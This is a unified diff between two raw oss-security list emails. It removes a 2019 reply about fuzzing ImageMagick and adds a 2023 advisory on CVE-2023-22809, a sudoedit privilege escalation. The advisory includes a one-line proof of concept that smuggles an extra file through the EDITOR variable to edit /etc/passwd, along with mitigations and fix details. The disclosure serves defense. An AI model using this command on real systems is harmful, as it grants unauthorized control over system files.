@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1446" "Wednesday" "6" "February" "2019" "09:41:02" "+0100" "Hanno =?iso-8859-1?Q?B=F6ck?=" "hanno@hboeck.de" "<20190206094102.11bb7daa@computer>" "37" "Re: [oss-security] Notes on fuzzing ImageMagick and GraphicsMagick" "^Cc:" nil nil "2" "2019020608:41:02" "[oss-security] Notes on fuzzing ImageMagick and GraphicsMagick" (number mark "        hanno@hboeck Feb  6   37/1446  " thread-indent "\"Re: [oss-security] Notes on fuzzing ImageMagick and GraphicsMagick\"\n") "<CAFRnB2XKwThukWHpZ_K_uVPfKtamwYQ7vkoL7-6UUpSLEZRFVw@mail.gmail.com>" ("<CAFRnB2XKwThukWHpZ_K_uVPfKtamwYQ7vkoL7-6UUpSLEZRFVw@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0001
-X-Mozilla-Status2: 00000000
-Received: (qmail 19862 invoked by uid 550); 6 Feb 2019 08:41:15 -0000
+Received: (qmail 26048 invoked by uid 550); 19 Jan 2023 07:30:22 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,55 +6,102 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 19842 invoked from network); 6 Feb 2019 08:41:15 -0000
-Message-ID: <20190206094102.11bb7daa@computer>
-In-Reply-To: <CAFRnB2XKwThukWHpZ_K_uVPfKtamwYQ7vkoL7-6UUpSLEZRFVw@mail.gmail.com>
-References: <CAFRnB2XKwThukWHpZ_K_uVPfKtamwYQ7vkoL7-6UUpSLEZRFVw@mail.gmail.com>
-X-Mailer: Claws Mail 3.17.3 (GTK+ 2.24.32; x86_64-pc-linux-gnu)
-MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: quoted-printable
-Cc: oss-security@lists.openwall.com
-Date: Wed, 6 Feb 2019 09:41:02 +0100
-From: Hanno =?iso-8859-1?q?B=F6ck?= <hanno@hboeck.de>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] Notes on fuzzing ImageMagick and GraphicsMagick
-To: Alex Gaynor <alex.gaynor@gmail.com>
+Received: (qmail 10208 invoked from network); 19 Jan 2023 00:34:37 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=synacktiv.com; s=google;
+        h=to:subject:message-id:date:from:mime-version:from:to:cc:subject
+         :date:message-id:reply-to;
+        bh=FpArvq/h/LVtbmj0FYhevHqcS0z8/1j4Fc1Pceb0/xA=;
+        b=c4r0TdReFX1/ZjQiN6hao/aSiMUWfS9efqRWGHZCFOHr15uQrHiXkMIN6Lih5oZK0g
+         JTzkQU2jDzCs5haJuJHa5jAOL7ZDQYhA00zNQNel20JRJOpiA3r3fJ9psZqehVFheeEW
+         F3xCguGcnX6LLwtkpA+wY/KFFvsxDCrbYcHHM=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=to:subject:message-id:date:from:mime-version:x-gm-message-state
+         :from:to:cc:subject:date:message-id:reply-to;
+        bh=FpArvq/h/LVtbmj0FYhevHqcS0z8/1j4Fc1Pceb0/xA=;
+        b=le124gcjXWQ07YU8DQuHvFSrHL7lPmUMwIurZVKbN4BE8Y+aA0KQk4C5l+tnEMDQwk
+         8fbAf3cNcOKyvXcJSqmR9N1gv3HCpVK9niZRyDsHQ+Tpn6+qsEufxYQwAKEx4CHexIji
+         ZpBJWDy4XF2E3aaTbcGDFww9lVJFk7p7ZGfk6gHdyskubfpHzFA9BXr5AyjdRJ1pQMtl
+         lJvLdQJS8ILpkqSYCOz7JCT8WGuWjn8Bk4+gXbssilwP7JlZsoQG/Y0puIHI0wfFIaaN
+         ed8mLL9M7+7zaVuoJLNhvf2HYoXKd6Qks3X2XIdkMBaQOOsfX22bgc6TeF+tSessWkyX
+         Pr6Q==
+X-Gm-Message-State: AFqh2koFRfjoAIj9Hq4y0FoA+JTafZhNpvooSiH0iI6eqU17rso9XNkm
+	HoNP10KH9Iz70Mszs9qsSb12E1Bmj3blby1Q2EpFuIdebUKuWBtVDkg=
+X-Google-Smtp-Source: AMrXdXvxNeUDID7YvVxvhNG1rGh62tN0J/fvHIvgISN9UYc3uGLyEuno8wnCv33c7zUI8WuGVX9287hWvt+yorunqKA=
+X-Received: by 2002:a25:d753:0:b0:76a:e558:48ec with SMTP id
+ o80-20020a25d753000000b0076ae55848ecmr960692ybg.384.1674088464976; Wed, 18
+ Jan 2023 16:34:24 -0800 (PST)
+MIME-Version: 1.0
+From: Matthieu Barjole <matthieu.barjole@synacktiv.com>
+Date: Thu, 19 Jan 2023 01:33:43 +0100
+Message-ID: <CAE-GootkXskaRKTmdPg1KsL3cm2oPq8DtL14MoupwX_CaVDeXw@mail.gmail.com>
+To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="00000000000047387205f293183a"
+Subject: [oss-security] CVE-2023-22809: Sudoedit can edit arbitrary files
 
-On Tue, 5 Feb 2019 17:28:03 -0500
-Alex Gaynor <alex.gaynor@gmail.com> wrote:
+--00000000000047387205f293183a
+Content-Type: text/plain; charset="UTF-8"
 
-> Both ImageMagick and GraphicsMagick had been widely fuzzed and audited
-> before
-> this. Hanno B=C3=B6ck [#]_ observed: "In the past it was pretty easy to
-> bugs in
-> imagemagick, but after some review by Google most of them have been
-> fixed and
-> these days there are at least no more trivial to find fuzzing issues."
+Hello everyone,
 
-Even though you had a disclaimer I feel I want to give a short answer.
-That quote probably comes from a page that I removed a while ago and
-now says " I'm no longer maintaining this list, as it was extremely
-outdated."
+While auditing Sudo, Synacktiv identified a privilege escalation in sudoedit
+when a user is authorized to use it by the sudoers policy. This
+vulnerability
+was assigned CVE-2023-22809 and affects Sudo versions 1.8.0 through 1.9.12p1
+inclusive.
 
-It's at least 3 years old and back then we were in a state where you
-could pick a random command line tool, run afl+asan against it and
-crashes would fall out within seconds.
-My intent back then was to establish some baseline robustness, so take
-my words there as "it's not that easy any more to find bugs in IM/GM
-within very short timeframes and very simple methods". Which I guess is
-still true and not in contradiction that with more involved methods
-you'll find more.
+## Analysis
 
+The technical analysis can be found in the following security advisory:
+https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
 
-These days my remaining worries about fuzzing-related bugs are
-primarily targets that don't fit into the libfuzzer/oss-fuzz framework,
-e.g. networking-software that has no easy way to abstract their parser
-code into a function call.
+## Proof of Concept
 
---=20
-Hanno B=C3=B6ck
-https://hboeck.de/
+Assuming the following sudoers policy:
 
-mail/jabber: hanno@hboeck.de
-GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
+```
+# cat /etc/sudoers
+user ALL=(ALL:ALL) sudoedit /etc/motd
+[...]
+```
+
+Arbitrary files such as `/etc/passwd` may also be edited as such:
+
+```
+EDITOR='vim -- /etc/passwd' sudoedit /etc/motd
+```
+
+## Mitigation
+
+It is possible to prevent a user-specified editor from being used by
+sudoedit by
+adding the following line to the sudoers file.
+
+```
+Defaults!sudoedit   env_delete+="SUDO_EDITOR VISUAL EDITOR"
+```
+
+To restrict the editor when editing specific files, a Cmnd_Alias can be
+used,
+for example:
+
+```
+Cmnd_Alias          EDIT_MOTD = sudoedit /etc/motd
+Defaults!EDIT_MOTD  env_delete+="SUDO_EDITOR VISUAL EDITOR"
+user                ALL = EDIT_MOTD
+```
+
+## Fix
+
+The issue was fixed in Sudo 1.9.12.p2.
+
+## References
+
+[1]
+https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf
+[2] https://www.sudo.ws/security/advisories/sudoedit_any/
+[3] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809
+
+--00000000000047387205f293183a--
